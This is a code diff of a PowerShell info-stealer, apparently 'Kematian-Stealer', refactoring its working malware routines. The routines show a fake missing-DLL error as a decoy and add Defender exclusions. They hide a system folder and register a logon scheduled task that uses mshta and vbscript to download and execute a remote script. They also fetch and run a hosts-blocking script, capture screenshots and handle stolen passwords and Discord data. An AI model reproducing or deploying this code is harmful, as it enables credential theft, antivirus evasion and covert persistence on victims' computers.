@@ -22,17 +22,21 @@ $avatar = "https://i.imgur.com/DOIYOtp.gif"
 Add-Type -AssemblyName PresentationCore, PresentationFramework, System.Net.Http, System.Windows.Forms, System.Drawing
 
 function KDMUTEX {
-    if ($fakeerror ) { [Windows.Forms.MessageBox]::Show("The program can't start because MSVCP110.dll is missing from your computer. Try reinstalling the program to fix this problem.", '', 'OK', 'Error') }
-    $AppId = "62088a7b-ae9f-4802-827a-6e9c921cb48e" 
+    if ($fakeerror) {
+        [Windows.Forms.MessageBox]::Show("The program can't start because MSVCP110.dll is missing from your computer. Try reinstalling the program to fix this problem.", '', 'OK', 'Error')
+    }
+
+    $AppId = "62088a7b-ae9f-4802-827a-6e9c921cb48e"
     $CreatedNew = $false
     $script:SingleInstanceEvent = New-Object Threading.EventWaitHandle $true, ([Threading.EventResetMode]::ManualReset), "Global\$AppID", ([ref] $CreatedNew)
-    if ( -not $CreatedNew ) { throw "[!] An instance of this script is already running." }
-    else {
-        if (($criticalprocess) -and (-not $debug)) {
-            [ProcessUtility]::MakeProcessCritical()
-        }
-        Invoke-TASKS
+
+    if (-not $CreatedNew) {
+        throw "[!] An instance of this script is already running."
     }
+    elseif ($criticalprocess -and -not $debug) {
+        [ProcessUtility]::MakeProcessCritical()
+    }
+    Invoke-TASKS
 }
 
 
@@ -75,16 +79,13 @@ function Invoke-TASKS {
     if ($persistence) {
         Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Temp" -Force
         Add-MpPreference -ExclusionPath "$env:APPDATA\Kematian" -Force
-        New-Item -ItemType Directory -Path "$env:APPDATA\Kematian" -Force | Out-Null
-        # Hidden Directory
-        $KDOT_DIR = get-item "$env:APPDATA\Kematian" -Force
-        $KDOT_DIR.attributes = "Hidden", "System"
+        $KDOT_DIR = New-Item -ItemType Directory -Path "$env:APPDATA\Kematian" -Force
+        $KDOT_DIR.Attributes = "Hidden", "System"
         $task_name = "Kematian"
-        if ($debug) {
-            $task_action = New-ScheduledTaskAction -Execute "Powershell.exe" -Argument "-ExecutionPolicy Bypass -NoProfile -C `"`$webhook = '$webhook' ; iwr https://raw.githubusercontent.com/ChildrenOfYahweh/Kematian-Stealer/main/frontend-src/autorun.ps1 | iex`""
-        }
-        else {
-            $task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `$webhook='$webhook';iwr('https://raw.githubusercontent.com/ChildrenOfYahweh/Kematian-Stealer/main/frontend-src/autorun.ps1')|iex`",0)(window.close)"
+        $task_action = if ($debug) {
+            New-ScheduledTaskAction -Execute "Powershell.exe" -Argument "-ExecutionPolicy Bypass -NoProfile -C `"`$webhook = '$webhook' ; iwr https://raw.githubusercontent.com/ChildrenOfYahweh/Kematian-Stealer/main/frontend-src/autorun.ps1 | iex`""
+        } else {
+            New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `$webhook='$webhook';iwr('https://raw.githubusercontent.com/ChildrenOfYahweh/Kematian-Stealer/main/frontend-src/autorun.ps1')|iex`",0)(window.close)"
         }
         $task_trigger = New-ScheduledTaskTrigger -AtLogOn
         $task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
@@ -92,8 +93,8 @@ function Invoke-TASKS {
         Write-Host "[!] Task Created" -ForegroundColor Green
     }
     if ($blockhostsfile) {
-        $link = ("https://github.com/ChildrenOfYahweh/Kematian-Stealer/raw/main/frontend-src/blockhosts.ps1")
-        iex (iwr -uri $link -useb)
+        $link = "https://github.com/ChildrenOfYahweh/Kematian-Stealer/raw/main/frontend-src/blockhosts.ps1"
+        iex (iwr -Uri $link -UseBasicParsing)
     }
     Backup-Data
 }
@@ -206,9 +207,28 @@ function Backup-Data {
     }
     $avlist = Get-InstalledAV | Format-Table | Out-String
     
-    $width = (Get-WmiObject -Class Win32_VideoController).VideoModeDescription -split '\n' | Select-Object -First 1 | ForEach-Object { ($_ -split ' ')[0] }
-    $height = (Get-WmiObject -Class Win32_VideoController).VideoModeDescription -split '\n' | Select-Object -First 1 | ForEach-Object { ($_ -split ' ')[2] }
-    $screen = "$width x $height"
+    $wmicOutput = wmic path Win32_VideoController get VideoModeDescription /format:csv
+
+    $totalWidth = 0
+    $maxHeight = 0
+
+    $wmicOutput | ForEach-Object {
+        if ($_ -match "(\d+) x (\d+)") {
+            $width = [int]$matches[1]
+            $height = [int]$matches[2]
+            $totalWidth += $width
+            if ($height -gt $maxHeight) {
+                $maxHeight = $height
+            }
+        }
+    }
+
+    $combinedResolution = [PSCustomObject]@{
+        TotalWidth  = $totalWidth
+        MaxHeight   = $maxHeight
+    }
+
+    $screen = "$($combinedResolution.TotalWidth) x $($combinedResolution.MaxHeight)"
 
     $software = Get-ItemProperty "HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" |
     Where-Object { $_.DisplayName -ne $null -and $_.DisplayVersion -ne $null } |
@@ -816,14 +836,15 @@ Pass: $decodedPass
     $screens = [Windows.Forms.Screen]::AllScreens
     $top = ($screens.Bounds.Top | Measure-Object -Minimum).Minimum
     $left = ($screens.Bounds.Left | Measure-Object -Minimum).Minimum
-    $bounds = [Drawing.Rectangle]::FromLTRB($left, $top, $width, $height)
+    $bounds = [Drawing.Rectangle]::FromLTRB($left, $top, $combinedResolution.TotalWidth, $combinedResolution.MaxHeight)
     $image = New-Object Drawing.Bitmap ([int]$bounds.width), ([int]$bounds.height)
     $graphics = [Drawing.Graphics]::FromImage($image)
     $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)
     $image.Save("$main_temp\screenshot.png")
     $graphics.Dispose()
     $image.Dispose() 
- 
+
+
     Write-Host "[!] Screenshot Captured !" -ForegroundColor Green
 
     Move-Item "$main_temp\discord.json" $folder_general -Force    
@@ -1136,7 +1157,7 @@ if (CHECK_AND_PATCH -eq $true) {
     }
 }
 else {
-    Write-Host ("[!] Please run as admin!") -ForegroundColor Red
+    Write-Host "[!] Please run as admin!" -ForegroundColor Red
     Start-Sleep -s 1
     Request-Admin
 }
